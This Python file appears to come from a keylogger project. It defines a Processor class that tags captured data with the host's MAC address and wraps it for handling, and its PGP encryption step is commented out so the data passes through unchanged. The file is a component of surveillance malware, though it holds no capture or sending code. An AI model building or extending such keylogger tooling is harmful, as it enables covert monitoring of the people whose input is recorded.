# import time
from typing import List
from keylogger.data_wrapper import DataWrapper
from getmac import get_mac_address

# from pgpy import PGPKey, PGPMessage


class Processor:
    def __init__(self, key: str):
        self.mac = get_mac_address()
        # self.key = PGPKey.from_blob(key)

    def process_data(self, data):
        encrypted_data = self._encrypt(data)
        data_wrapper = DataWrapper(encrypted_data, self.mac)
        return data_wrapper

    def _encrypt(self, data: List) -> List:
        # message = PGPMessage.new(data)
        # encrypted_message = self.key.encrypt(message)
        return data
